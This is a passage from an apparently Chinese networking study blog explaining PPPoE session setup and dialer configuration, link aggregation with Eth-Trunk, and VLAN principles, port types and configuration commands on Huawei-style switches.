src="https://pic.imgdb.cn/item/60f670e75132923bf8c30a89.png"></p><ul><li>PPPoE报文是使用Ethernet格式进行封装的，Ethernet中各字段解释如下：<ol><li>DMAC：表示目的设备的MAC地址，通常为以太网单播目的地址或者以太网广播地址(0xFFFFFFFF )</li><li>SMAC：表示源设备的以太网MAC地址</li><li>Type：表示协议类型字段，当值为0x8863时表示承载的是PPPoE发现阶段的报文。当值为0x8864时表示承载的是PPPoE会话阶段的报文</li></ol></li><li>PPPoE字段中的各个字段解释如下︰<ol><li>VER∶表示PPPoE版本号，值为0x01</li><li>Type：表示类型，值为0x01</li><li>Code ：表示PPPoE报文类型，不同取值标识不同的PPPoE报文类型</li><li>PPPoE会话ID，与以太网SMAC和DMAC一起定义了一个PPPoE会话</li><li>Length：表示PPPoE报文的Payload长度，不包括以太网头部和PPPoE头部的长度</li></ol></li></ul><h3 id="2-4-PPPoE会话建立过程"><a href="#2-4-PPPoE会话建立过程" class="headerlink" title="2.4 PPPoE会话建立过程"></a>2.4 PPPoE会话建立过程</h3><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>发现阶段</td><td>获取对方以太网地址，以及确定唯一的PPPoE会话</td></tr><tr><td>会话阶段</td><td>包含两部分：PPP协商阶段和PPP报文传输阶段</td></tr><tr><td>会话结束阶段</td><td>会话建立以后的任意时刻，发送报文结束PPPoE会话</td></tr></tbody></table><h3 id="2-5-PPPoE协议报文"><a href="#2-5-PPPoE协议报文" class="headerlink" title="2.5 PPPoE协议报文"></a>2.5 PPPoE协议报文</h3><ol><li>PADI ( PPPoE Active Discovery Initiation )报文∶用户主机发起的PPPoE服务器探测报文，目的MAC地址为广播地址</li><li>PADO (PPPoE Active Discovery Offer )报文：PPPoE服务器收到PADI报文之后的回应报文，目的MAC地址为客户端主机的MAC地址</li><li>PADR ( PPPoE Active Discovery Request )报文︰用户主机收到PPPoE服务器回应的PADO报文后，单播发起的请求报文，目的地址为此用户选定的那个PPPoE服务器的MAC地址</li><li>PADS ( PPPoE Active Discovery Session Configuration)报文：PPPoE服务器分配一个唯一的会话进程ID，并通过PADS报文发送给主机</li><li>PADT ( PPPoE Active Discovery Terminate )报文︰当用户或者服务器需要终止会话时，可以发送这种PADT报文</li></ol><h3 id="2-6-PPPoE发现阶段"><a href="#2-6-PPPoE发现阶段" class="headerlink" title="2.6 PPPoE发现阶段"></a>2.6 PPPoE发现阶段</h3><ul><li>在发现阶段，PPPoE客户端在本地以太网中广播一个PADI报文，此PADI报文中包含了客户端需要的服务信息。在PADI报文中，目的MAC地址是一个广播地址，Code字段为0x09，Session ID字段为0x0000。所有PPPoE服务器收到PADI报文之后，会将报文中所请求的服务与自己能够提供的服务进行比较</li><li>如果服务器可以提供客户端请求的服务，就会回复一个PADO报文。客户端(RTA)可能会收到多个PPPoE服务器发送的PADO报文。在PADO报文中，目的地址是发送PADI报文的客户端MAC地址，Code字段为0x07，Session ID字段为0x0000</li><li>因为PPPoE客户端是以广播的形式发送PADI报文，所以客户端可能会收到多个PADO报文。在接收到的所有PADO报文中，PPPoE客户端选择最先收到的PADO报文对应的PPPoE服务器，并发送一个PADR报文给这个服务器。在PADR报文中，目的地址是选中的服务器的MAC地址，Code字段为0x19 , Session ID字段为0x0000</li><li>PPPoE服务器收到PADR报文后，会生成一个唯一的Session ID来标识和PPPoE客户端的会话，并通过一个PADS报文把Session ID发送给PPPoE客户端。在PADS报文中，目的地址是PPPoE客户端的MAC地址，Code字段为0x65，Session ID字段是PPPoE服务器为本PPPoE会话产生的Session ID。会话建立成功后，PPPoE客户端和服务器进入PPPoE会话阶段</li></ul><h3 id="2-7-PPPoE会话阶段"><a href="#2-7-PPPoE会话阶段" class="headerlink" title="2.7 PPPoE会话阶段"></a>2.7 PPPoE会话阶段</h3><ul><li>PPPoE会话阶段可分为两部分：PPP协商阶段和PPP报文传输阶段<ol><li>PPPoE Session上的PPP协商和普通的PPP协商方式一致，分为LCP、认证、NCP三个阶段。LCP阶段主要完成建立、配置和检测数据链路连接。LCP协商成功后，开始进行认证，认证协议类型由LCP协商结果决定。认证成功后，PPP进入NCP阶段，NCP是一个协议族，用于配置不同的网络层协议，常用的是IP控制协议(IPCP)，它负责配置用户的IP地址和DNS服务器地址等</li><li>PPPoE Session的PPP协商成功后，就可以承载PPP数据报文。在这一阶段传输的数据包中必须包含在发现阶段确定的Session ID并保持不变</li></ol></li></ul><h3 id="2-8-PPPoE会话终结"><a href="#2-8-PPPoE会话终结" class="headerlink" title="2.8 PPPoE会话终结"></a>2.8 PPPoE会话终结</h3><ul><li>当PPPOE客户端希望关闭连接时，可以向PPPOE服务器端发送一个PADT报文。同样，如果PPPOE服务器端希望关闭连接时，也可以向PPPOE客户端发送一个PADT报文，此报文用于关闭连接</li><li>在PADT报文中，目的MAC地址为单播地址，Session ID为希望关闭的连接的Session ID。一旦收到一个PADT报文之后，连接随即关闭</li></ul><h3 id="2-9-PPPoE会话建立过程"><a href="#2-9-PPPoE会话建立过程" class="headerlink" title="2.9 PPPoE会话建立过程"></a>2.9 PPPoE会话建立过程</h3><p><img src="https://pic.imgdb.cn/item/60f672965132923bf8ca346c.png"></p><ol><li>用户客户端向服务器发送一个PADI报文，开始PPPOE接入</li><li>服务器向客户端发送PADO报文</li><li>客户端根据回应，发起PADR请求给服务器</li><li>服务器产生一个Session ID，通过PADS发给客户端</li><li>客户端和服务器之间进行PPP的LCP协商，建立链路层通信。同时，协商使用CHAP认证方式</li><li>服务器通过Challenge报文发送给认证客户端，提供一个128bit的Challenge</li><li>客户端收到Challenge报文后，并将密码和Challenge做MD5算法运算后，在Response回应报文中把结果发送给服务器</li><li>服务器根据用户发送的信息判断用户是否合法，然后回应认证成功/失败报文，将认证结果返回给客户端</li><li>进行NCP(如IPCP )协商，通过服务器获取到规划的IP地址等参数</li></ol><h3 id="2-10-PPPoE配置"><a href="#2-10-PPPoE配置" class="headerlink" title="2.10 PPPoE配置"></a>2.10 PPPoE配置</h3><ul><li>PPPoE客户端配置包括三个步骤<ol><li>首先需要配置一个拨号接口<ul><li><code>dialer-rule</code>命令用于进入Dialer-rule视图，在该视图下，可以通过拨号规则来配置发起PPPoE会话的条件</li><li><code>interface dialer number</code>命令用来创建并进入Dialer接口</li><li><code>dialer user user-name</code>命令用于配置对端用户名，这个用户名必须与对端服务器上的PPP用户名相同</li><li><code>dialer-group group-number</code>命令用来将接口置于一个拨号访问组</li><li><code>dialer bundle number</code>命令用来指定Dialer接口使用的Dialer bundle。设备通过Dialerbundle将物理接口与拨号接口关联起来</li></ul></li><li>第二个步骤是在接口上将Dialer Bundle和接口绑定︰<ul><li><code>pppoe-client dial-bundle-number number</code>命令来实现Dialer Bundle和物理接口的绑定，用来指定PPPoE会话对应的Dialer Bundle，其中number是与PPPoE会话相对应的Dialer Bundle编号</li><li><code>on-demand</code>表示PPPoE会话工作在按需拨号模式。AR2200支持报文触发方式的按需拨号。目前ARG3系列路由器支持的按需拨号方式为报文触发方式，即当物理线路Up后，设备不会立即发起PPPoE呼叫，只有当有数据需要传送时，设备才会发起PPPoE呼叫，建立PPPoE会话</li></ul></li><li>第三个步骤是配置一条缺省静态路由，该路由允许在路由表中没有相应匹配表项的流量都能通过拨号接口发起PPPoE会话</li></ol></li></ul><h3 id="2-11-配置验证"><a href="#2-11-配置验证" class="headerlink" title="2.11 配置验证"></a>2.11 配置验证</h3><ul><li><code>display interface dialer</code><em>[ number]</em> 命令用于查看拨号接口的配置，便于定位拨号接口的故障</li><li><code>LCP opened</code>, <code>IPCP opened</code>表示链路的状态完全正常</li><li><code>display pppoe-client session summary</code>命令用于查看PPPoE客户端的PPPoE会话状态和统计信息</li><li><strong>ID</strong>表示PPPoE会话ID，Bundle ID和Dialer ID的值与拨号参数配置有关</li><li><strong>Intf</strong>表示客户端侧协商时的物理接口</li><li><strong>State</strong>表示PPPoE会话的状态，包括以下四种∶<ol><li>IDLE表示当前会话状态为空闲</li><li>PADI表示PPPoE会话处于发现阶段，并已经发送PADI报文</li><li>PADR表示PPPoE会话处于发现阶段，并已经发送PADR报文</li><li>UP表示PPPoE会话建立成功</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>广域网技术介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链路聚合,VLAN原理与配置,VLAN间路由</title>
    <link href="/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E8%BF%9B%E9%98%B6/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88,VLAN%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE,VLAN%E9%97%B4%E8%B7%AF%E7%94%B1/"/>
    <url>/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E8%BF%9B%E9%98%B6/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88,VLAN%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE,VLAN%E9%97%B4%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[<h1 id="链路聚合-VLAN原理与配置-VLAN间路由"><a href="#链路聚合-VLAN原理与配置-VLAN间路由" class="headerlink" title="链路聚合,VLAN原理与配置,VLAN间路由"></a>链路聚合,VLAN原理与配置,VLAN间路由</h1><h2 id="1-链路聚合"><a href="#1-链路聚合" class="headerlink" title="1. 链路聚合"></a>1. 链路聚合</h2><h3 id="1-1-链路聚合的应用场景"><a href="#1-1-链路聚合的应用场景" class="headerlink" title="1.1 链路聚合的应用场景"></a>1.1 链路聚合的应用场景</h3><p><img src="https://pic.imgdb.cn/item/60f6267b5132923bf8d147af.png"></p><p>在企业网络中，所有设备的流量在转发到其他网络前都会汇聚到核心层，再由核心区设备转发到其他网络，或者转发到外网。因此，在核心层设备负责数据的高速交换时，容易发生拥塞。在核心层部署链路聚合，可以提升整个网络的数据吞吐量，解决拥塞问题</p><p>本示例中，两台核心交换机SWA和SWB之间通过两条成员链路互相连接，通过部署链路聚合，可以确保SWA和SWB之间的链路不会产生拥塞</p><h3 id="1-2-链路聚合"><a href="#1-2-链路聚合" class="headerlink" title="1.2 链路聚合"></a>1.2 链路聚合</h3><ul><li>链路聚合是把两台设备之间的多条物理链路聚合在一起，当做一条逻辑链路来使用。这两台设备可以是一对路由器，一对交换机，或者是一台路由器和一台交换机。一条聚合链路可以包含多条成员链路，在ARG3系列路由器和X7系列交换机上默认最多为8条</li><li>链路聚合能够提高链路带宽。理论上，通过聚合几条链路，一个聚合口的带宽可以扩展为所有成员口带宽的总和，这样就有效地增加了逻辑链路的带宽</li><li>链路聚合为网络提供了高可靠性。配置了链路聚合之后，如果一个成员接口发生故障，该成员口的物理链路会把流量切换到另一条成员链路上</li><li>链路聚合还可以在一个聚合口上实现负载均衡，一个聚合口可以把流量分散到多个不同的成员口上，通过成员链路把流量发送到同一个目的地，将网络产生拥塞的可能性降到最低</li></ul><h3 id="1-3-链路聚合模式"><a href="#1-3-链路聚合模式" class="headerlink" title="1.3 链路聚合模式"></a>1.3 链路聚合模式</h3><ul><li><p>链路聚合包含两种模式︰手动负载均衡模式和LACP(Link Aggregation ControlProtocol )模式</p><ol><li><p>手工负载分担模式下，Eth-Trunk的建立、成员接口的加入由手工配置，没有链路聚合控制协议的参与</p><p>该模式下所有活动链路都参与数据的转发，平均分担流量，因此称为负载分担模式。如果某条活动链路故障，链路聚合组自动在剩余的活动链路中平均分担流量。当需要在两个直连设备间提供一个较大的链路带宽而设备又不支持LACP协议时，可以使用手工负载分担模式</p><p>ARG3系列路由器和X7系列交换机可以基于目的MAC地址，源MAC地址，或者基于源MAC地址和目的MAC地址，源IP地址，目的IP地址，或者基于源IP地址和目的IP地址进行负载均衡</p></li><li><p>在LACP模式中，链路两端的设备相互发送LACP报文，协商聚合参数。协商完成后，两台设备确定活动接口和非活动接口</p><p>在LACP模式中，需要手动创建一个Eth-Trunk口，并添加成员口</p><ul><li>LACP协商选举活动接口和非活动接口</li><li>LACP模式也叫M:N模式</li><li>M代表活动成员链路，用于在负载均衡模式中转发数据</li><li>N代表非活动链路，用于冗余备份</li><li>如果一条活动链路发生故障，该链路传输的数据被切换到一条优先级最高的备份链路上，这条备份链路转变为活动状态。</li></ul></li></ol></li><li><p>两种链路聚合模式的主要区别是∶在LACP模式中，一些链路充当备份链路。在手动负载均衡模式中，所有的成员口都处于转发状态</p></li></ul><h3 id="1-4-数据流控制"><a href="#1-4-数据流控制" class="headerlink" title="1.4 数据流控制"></a>1.4 数据流控制</h3><ul><li><p>在一个聚合口中，聚合链路两端的物理口(即成员口)的所有参数必须一致，包括物理口的数量，传输速率，双工模式和流量控制模式。成员口可以是二层接口或三层接口</p></li><li><p>数据流在聚合链路上传输，数据顺序必须保持不变。一个数据流可以看做是一组MAC地址和IP地址相同的帧。</p><p>例如，两台设备间的SSH或SFTP连接可以看做一个数据流。如果未配置链路聚合，只是用一条物理链路来传输数据，那么一个数据流中的帧总是能按正确的顺序到达目的地。配置了链路聚合后，多条物理链路被绑定成一条聚合链路，一个数据流中的帧通过不同的物理链路传输</p><p>如果第一个帧通过一条物理链路传输，第二个帧通过另外一条物理链路传输，这样一来同一数据流的第二个数据帧就有可能比第一个数据帧先到达对端设备，从而产生接收数据包乱序的情况</p></li><li><p>为了避免这种情况的发生，Eth-Trunk采用逐流负载分担的机制，这种机制把数据帧中的地址通过HASH算法生成HASH-KEY值，然后根据这个数值在Eth-Trunk转发表中寻找对应的出接口，不同的MAC或IP地址HASH得出的HASH-KEY值不同，从而出接口也就不同，这样既保证了同一数据流的帧在同一条物理链路转发，又实现了流量在聚合组内各物理链路上的负载分担，即逐流的负载分担。逐流负载分担能保证包的顺序，但不能保证带宽利用率</p></li><li><p>负载分担的类型主要包括以下几种，用户可以根据具体应用选择不同的负载分担类型</p><ol><li>根据报文的源MAC地址进行负载分担</li><li>根据报文的目的MAC地址进行负载分担</li><li>根据报文的源IP地址进行负载分担</li><li>根据报文的目的IP地址进行负载分担</li><li>根据报文的源MAC地址和目的MAC地址进行负载分担</li><li>根据报文的源IP地址和目的IP地址进行负载分担</li><li>根据报文的VLAN、源物理端口等对L2、IPv4、IPv6和MPLS报文进行增强型负载分担</li></ol></li></ul><h3 id="1-5-二层链路聚合配置"><a href="#1-5-二层链路聚合配置" class="headerlink" title="1.5 二层链路聚合配置"></a>1.5 二层链路聚合配置</h3><p><img src="https://pic.imgdb.cn/item/60f629bf5132923bf8da40c9.png"></p><p>本例中，通过执行<code>interface Eth-trunk &lt;trunk-id&gt;</code>命令配置链路聚合</p><p>这条命令创建了一个Eth-Trunk口，并且进入该Eth-Trunk口视图。trunk-id用来唯一标识一个Eth-Trunk口，该参数的取值可以是0到63之间的任何一个整数。如果指定的Eth-Trunk口已经存在，执行<code>interface eth-trunk</code>命令会直接进入该Eth-Trunk口视图</p><p>配置Eth-Trunk口和成员口，需要注意以下规则</p><ol><li>只能删除不包含任何成员口的Eth-Trunk口</li><li>把接口加入Eth-Trunk口时，二层Eth-Trunk口的成员口必须是二层接口，三层Eth-Trunk口的成员口必须是三层接口</li><li>一个Eth-Trunk口最多可以加入8个成员口</li><li>加入Eth-Trunk口的接口必须是hybrid接口（默认的接口类型)。一个Eth-Trunk口不能充当其他Eth-Trunk口的成员口</li><li>一个以太接口只能加入一个Eth-Trunk口。如果把一个以太接口加入另一个Eth-Trunk口，必须先把该以太接口从当前所属的Eth-Trunk口中删除</li><li>一个Eth-Trunk口的成员口类型必须相同。例如，一个快速以太口（FE口)和一个千兆以太口(GE口)不能加入同一个Eth-Trunk</li><li>位于不同接口板(LPU )上的以太口可以加入同一个Eth-Trunk口。如果一个对端接口直接和本端Eth-Trunk口的一个成员口相连，该对端接口也必须加入一个Eth-Trunk口。否则两端无法通信</li><li>如果成员口的速率不同，速率较低的接口可能会拥塞，报文可能会被丢弃</li><li>接口加入Eth-Trunk口后，Eth-Trunk口学习MAC地址，成员口不再学习</li></ol><h3 id="1-6-查看链路聚合信息"><a href="#1-6-查看链路聚合信息" class="headerlink" title="1.6 查看链路聚合信息"></a>1.6 查看链路聚合信息</h3><p>执行<code>display interface eth-trunk &lt;trunk-id&gt;</code>命令，可以确认两台设备间是否已经成功实现链路聚合。也可以使用这条命令收集流量统计数据，定位接口故障。如果Eth-Trunk口处于UP状态，表明接口正常运行。如果接口处于Down状态，表明所有成员口物理层发生故障。如果管理员手动关闭端口，接口处于Administratively DOWN状态。可以通过接口状态的改变发现接口故障，所有接口正常情况下都应处于Up状态</p><h3 id="1-7-三层链路聚合配置"><a href="#1-7-三层链路聚合配置" class="headerlink" title="1.7 三层链路聚合配置"></a>1.7 三层链路聚合配置</h3><p><img src="https://pic.imgdb.cn/item/60f62a955132923bf8dc91e2.png"></p><p>如果要在路由器上配置三层链路聚合，需要首先创建Eth-Trunk接口</p><p>然后在Eth-Trunk逻辑口上执行<code>undo portswitch</code>命令，把聚合链路从二层转为三层链路。执行<code>undo portswitch</code>命令后，可以为Eth-Trunk逻辑口分配一个IP地址</p><h2 id="2-VLAN原理与配置"><a href="#2-VLAN原理与配置" class="headerlink" title="2. VLAN原理与配置"></a>2. VLAN原理与配置</h2><h3 id="2-1-传统以太网"><a href="#2-1-传统以太网" class="headerlink" title="2.1 传统以太网"></a>2.1 传统以太网</h3><ul><li>早期的局域网LAN技术是基于总线型结构的，它存在以下主要问题<ol><li>若某时刻有多个节点同时试图发送消息，那么它们将产生冲突</li><li>从任意节点发出的消息都会被发送到其他节点，形成广播</li><li>所有主机共享一条传输通道，无法控制网络中的信息安全</li><li>这种网络构成了一个冲突域，网络中计算机数量越多，冲突越严重，网络效率越低。同时，该网络也是一个广播域，当网络中发送信息的计算机数量变多时，广播流量将会耗费大量带宽</li></ol></li><li>因此，传统局域网不仅面临冲突域太大和广播域太大两大难题，而且无法保障传输信息的安全</li><li>为了扩展传统LAN，以接入更多计算机，同时避免冲突的恶化，出现了网桥和二层交换机，它们能有效隔离冲突域</li><li>网桥和交换机采用交换方式将来自入端口的信息转发到出端口上，克服了共享网络中的冲突问题。但是，采用交换机进行组网时，广播域和信息安全问题依旧存在。</li><li>为限制广播域的范围，减少广播流量，需要在没有二层互访需求的主机之间进行隔离。路由器是基于三层IP地址信息来选择路由和转发数据的，其连接两个网段时可以有效抑制广播报文的转发，但成本较高</li><li>因此，人们设想在物理局域网上构建多个逻辑局域网，即VLAN</li></ul><h3 id="2-2-VLAN技术"><a href="#2-2-VLAN技术" class="headerlink" title="2.2 VLAN技术"></a>2.2 VLAN技术</h3><ul><li><p>VLAN技术可以将一个物理局域网在逻辑上划分成多个广播域，也就是多个VLAN。VLAN技术部署在数据链路层，用于隔离二层流量。同一个VLAN内的主机共享同一个广播域，它们之间可以直接进行二层通信。而VLAN间的主机属于不同的广播域，不能直接实现二层互通。这样，广播报文就被限制在各个相应的VLAN内，同时也提高了网络安全性</p></li><li><p>本例中</p><p><img src="https://pic.imgdb.cn/item/60f62bfe5132923bf8e07066.png"></p><p>原本属于同一广播域的主机被划分到了两个VLAN中，即，VLAN1和VLAN2。VLAN内部的主机可以直接在二层互相通信，VLAN1和VLAN2之间的主机无法直接实现二层通信</p></li></ul><h3 id="2-3-VLAN帧格式"><a href="#2-3-VLAN帧格式" class="headerlink" title="2.3 VLAN帧格式"></a>2.3 VLAN帧格式</h3><p><img src="https://pic.imgdb.cn/item/60f62c2d5132923bf8e0f322.png"></p><ul><li>VLAN标签长4个字节，直接添加在以太网帧头中，IEEE802.1Q文档对VLAN标签作出了说明</li><li>TPID : Tag Protocol ldentifier，2字节，固定取值，0x8100，是IEEE定义的新类型，表明这是一个携带802.1Q标签的帧。如果不支持802.1Q的设备收到这样的帧，会将其丢弃</li><li>TCI : Tag Control Information，2字节。帧的控制信息，详细说明如下：<ol><li>Priority：3比特，表示帧的优先级，取值范围为0～7，值越大优先级越高。当交换机阻塞时，优先发送优先级高的数据帧</li><li>CFI：Canonical Format Indicator，1比特。CFI表示MAC地址是否是经典格式。CFI为O说明是经典格式，CFI为1表示为非经典格式。用于区分以太网帧、FDDI ( FiberDistributed Digital Interface )帧和令牌环网帧。在以太网中，CFI的值为0</li><li>VLAN Identifier：VLAN ID，12比特，在X7系列交换机中，可配置的VLAN ID取值范围为0～4095，但是0和4095在协议中规定为保留的VLAN ID，不能给用户使用</li></ol></li><li>在现有的交换网络环境中，以太网的帧有两种格式：<ol><li>没有加上VLAN标记的标准以太网帧( untagged frame )</li><li>有VLAN标记的以太网帧( tagged frame )</li></ol></li></ul><h3 id="2-4-链路类型"><a href="#2-4-链路类型" class="headerlink" title="2.4 链路类型"></a>2.4 链路类型</h3><p>VLAN链路分为两种类型:Access链路和Trunk链路</p><p><img src="https://pic.imgdb.cn/item/60f62cde5132923bf8e2dd88.png"></p><ol><li>接入链路(Access Link )：连接用户主机和交换机的链路称为接入链路。如本例所示，图中主机和交换机之间的链路都是接入链路</li><li>干道链路(Trunk Link)：连接交换机和交换机的链路称为干道链路。如本例所示，图中交换机之间的链路都是干道链路。干道链路上通过的帧一般为带Tag的VLAN帧</li></ol><h3 id="2-5-PVID"><a href="#2-5-PVID" class="headerlink" title="2.5 PVID"></a>2.5 PVID</h3><p>PVID即Port VLAN ID，代表端口的缺省VLAN</p><p>交换机从对端设备收到的帧有可能是Untagged的数据帧，但所有以太网帧在交换机中都是以Tagged的形式来被处理和转发的，因此交换机必须给端口收到的Untagged数据帧添加上Tag</p><p>为了实现此目的，必须为交换机配置端口的缺省VLAN。当该端口收到Untagged数据帧时，交换机将给它加上该缺省VLAN的VLAN Tag</p><h3 id="2-6-端口类型-Access"><a href="#2-6-端口类型-Access" class="headerlink" title="2.6 端口类型-Access"></a>2.6 端口类型-Access</h3><ul><li><p>Access端口是交换机上用来连接用户主机的端口，它只能连接接入链路，并且只能允许唯一的VLANID通过本端口</p></li><li><p>Access端口收发数据帧的规则如下：</p><ol><li><p>如果该端口收到对端设备发送的帧是untagged (不带VLAN标签），交换机将强制加上该端口的PVID。如果该端口收到对端设备发送的帧是tagged(带VLAN标签），交换机会检查该标签内的VLAN ID。当VLAN ID与该端口的PVID相同时，接收该报文。当VLAN ID与该端口的PVID不同时，丢弃该报文</p></li><li><p>Access端口发送数据帧时，总是先剥离帧的Tag，然后再发送。Access端口发往对端设备的以太网帧永远是不带标签的帧</p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f62d675132923bf8e46406.png"></p><p>交换机的G0/0/1, G0/0/2, G0/0/3端口分别连接三台主机，都配置为Access端口。主机A把数据帧(未加标签)发送到交换机的G0/0/1端口，再由交换机发往其他目的地。收到数据帧之后，交换机根据端口的PVID给数据帧打上VLAN标签10，然后决定从G0/0/3端口转发数据帧。G0/0/3端口的PVID也是10，与VLAN标签中的VLAN ID相同，交换机移除标签，把数据帧发送到主机C。连接主机B的端口的PVID是2，与VLAN10不属于同一个VLAN，因此此端口不会接收到VLAN10的数据帧</p></li></ol></li></ul><h3 id="2-7-端口类型-Trunk"><a href="#2-7-端口类型-Trunk" class="headerlink" title="2.7 端口类型-Trunk"></a>2.7 端口类型-Trunk</h3><ul><li><p>Trunk端口是交换机上用来和其他交换机连接的端口，它只能连接干道链路。Trunk端口允许多个VLAN的帧(带Tag标记)通过</p></li><li><p>Trunk端口收发数据帧的规则如下：</p><ol><li><p>当接收到对端设备发送的不带Tag的数据帧时，会添加该端口的PVID，如果PVID在允许通过的VLAN ID列表中，则接收该报文，否则丢弃该报文。当接收到对端设备发送的带Tag的数据帧时，检查VLAN ID是否在允许通过的VLAN ID列表中。如果VLAN ID在接口允许通过的VLAN ID列表中，则接收该报文。否则丢弃该报文</p></li><li><p>端口发送数据帧时，当VLAN ID与端口的PVID相同，且是该端口允许通过的VLAN ID时，去掉Tag，发送该报文。当VLAN ID与端口的PVID不同，且是该端口允许通过的VLAN ID时，保持原有Tag，发送该报文</p></li></ol></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f62dcb5132923bf8e57dfc.png"></p><p>SWA和SWB连接主机的端口为Access端口，PVID如图所示。SWA和SWB互连的端口为Trunk端口，PVID都为1，此Trunk链路允许所有VLAN的流量通过。当SWA转发VLAN1的数据帧时会剥离VLAN标签，然后发送到Trunk链路上。而在转发VLAN20的数据帧时，不剥离VLAN标签直接转发到Trunk链路上</p></li></ul><h3 id="2-8-端口类型-Hybrid"><a href="#2-8-端口类型-Hybrid" class="headerlink" title="2.8 端口类型-Hybrid"></a>2.8 端口类型-Hybrid</h3><ul><li><p>Access端口发往其他设备的报文，都是Untagged数据帧，而Trunk端口仅在一种特定情况下才能发出untagged数据帧，其它情况发出的都是Tagged数据帧</p></li><li><p>Hybrid端口是交换机上既可以连接用户主机，又可以连接其他交换机的端口。Hybrid端口既可以连接接入链路又可以连接干道链路。Hybrid端口允许多个VLAN的帧通过，并可以在出端口方向将某些VLAN帧的Tag剥掉。华为设备默认的端口类型是Hybrid</p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f62e0c5132923bf8e63601.png"></p><p>要求主机A和主机B都能访问服务器，但是它们之间不能互相访问。此时交换机连接主机和服务器的端口，以及交换机互连的端口都配置为Hybrid类型。交换机连接主机A的端口的PVID是2，连接主机B的端口的PVID是3，连接服务器的端口的PVID是100</p></li><li><p>Hybrid端口收发数据帧的规则如下：</p><ol><li>当接收到对端设备发送的不带Tag的数据帧时，会添加该端口的PVID，如果PVID在允许通过的VLAN ID列表中，则接收该报文，否则丢弃该报文。当接收到对端设备发送的带Tag的数据帧时，检查VLAN ID是否在允许通过的VLAN ID列表中。如果VLAN ID在接口允许通过的VLAN ID列表中，则接收该报文，否则丢弃该报文</li><li>Hybrid端口发送数据帧时，将检查该接口是否允许该VLAN数据帧通过。如果允许通过，则可以通过命令配置发送时是否携带Tag</li><li>配置<code>port hybrid tagged vlan vlan-id</code>命令后，接口发送该vlan-id的数据帧时，不剥离帧中的VLAN Tag，直接发送。该命令一般配置在连接交换机的端口上</li><li>配置<code>port hybrid untagged vlan vlan-id</code>命令后，接口在发送vlan-id的数据帧时，会将帧中的VLAN Tag剥离掉再发送出去。该命令一般配置在连接主机的端口上</li></ol></li><li><p>本例</p><p><img src="https://pic.imgdb.cn/item/60f62e7d5132923bf8e7875a.png"></p><p>介绍了主机A和主机B发送数据给服务器的情况。在SWA和SWB互连的端口上配置了port hybrid tagged vlan 2 3 100命令后，SWA和SWB之间的链路上传输的都是带Tag标签的数据帧。在SWB连接服务器的端口上配置了<code>port hybrid untagged vlan 2 3</code>，主机A和主机B发送的数据会被剥离VLAN标签后转发到服务器</p></li></ul><h3 id="2-9-VLAN划分方法"><a href="#2-9-VLAN划分方法" class="headerlink" title="2.9 VLAN划分方法"></a>2.9 VLAN划分方法</h3><p>VLAN的划分包括如下5种方法：</p><ol><li>基于端口划分：根据交换机的端口编号来划分VLAN。通过为交换机的每个端口配置不同的PVID，来将不同端口划分到VLAN中。初始情况下，X7系列交换机的端口处于VLAN1中。此方法配置简单，但是当主机移动位置时，需要重新配置VLAN</li><li>基于MAC地址划分：根据主机网卡的MAC地址划分VLAN。此划分方法需要网络管理员提前配置网络中的主机MAC地址和VLAN ID的映射关系。如果交换机收到不带标签的数据帧，会查找之前配置的MAC地址和VLAN映射表，根据数据帧中携带的MAC地址来添加相应的VLAN标签。在使用此方法配置VLAN时，即使主机移动位置也不需要重新配置VLAN</li><li>基于IP子网划分：交换机在收到不带标签的数据帧时，根据报文携带的IP地址给数据帧添加VLAN标签</li><li>基于协议划分：根据数据帧的协议类型(或协议族类型)、封装格式来分配VLAN ID。网络管理员需要首先配置协议类型和VLAN ID之间的映射关系</li><li>基于策略划分：使用几个条件的组合来分配VLAN标签。这些条件包括IP子网、端口和IP地址等。只有当所有条件都匹配时，交换机才为数据帧添加VLAN标签。另外，针对每一条策略都是需要手工配置的</li></ol><h3 id="2-10-VLAN配置"><a href="#2-10-VLAN配置" class="headerlink" title="2.10 VLAN配置"></a>2.10 VLAN配置</h3><p>在交换机上划分VLAN时，需要首先创建VLAN。在交换机上执行<code>vlan &lt;vlan-id&gt;</code>命令，创建VLAN</p><p>如本例所示</p><p><img src="https://pic.imgdb.cn/item/60f62f165132923bf8e94d03.png"></p><p>执行vlan 10命令后，就创建了VLAN 10，并进入了VLAN 10视图。VLAN ID的取值范围是1到4094</p><p>如需创建多个VLAN，可以在交换机上执行<code>vlan batch</code> <em>{ vlan-id1 [ to vlan-id2]}</em> 命令，以创建多个连续的VLAN。也可以执行<code>vlanbatch</code> <em>{ vlan-id1 vlan-id2}</em> 命令，创建多个不连续的VLAN，VLAN号之间需要有空格</p><h3 id="2-11-配置验证"><a href="#2-11-配置验证" class="headerlink" title="2.11 配置验证"></a>2.11 配置验证</h3><ul><li>创建VLAN后，可以执行<code>display vlan</code>命令验证配置结果。如果不指定任何参数，则该命令将显示所有VLAN的简要信息</li><li>执行<code>display vlan</code> *[ vlan-id [ verbose] ]*命令，可以查看指定VLAN的详细信息，包括VLAN ID、类型、描述、VLAN的状态、VLAN中的端口、以及VLAN中端口的模式等</li><li>执行<code>display vlan vlan-id statistics</code>命令，可以查看指定VLAN中的流量统计信息</li><li>执行<code>display vlan summary</code>命令，可以查看系统中所有VLAN的汇总信息</li></ul><h3 id="2-12-配置Access端口"><a href="#2-12-配置Access端口" class="headerlink" title="2.12 配置Access端口"></a>2.12 配置Access端口</h3><p>配置端口类型的命令是<code>port link-type 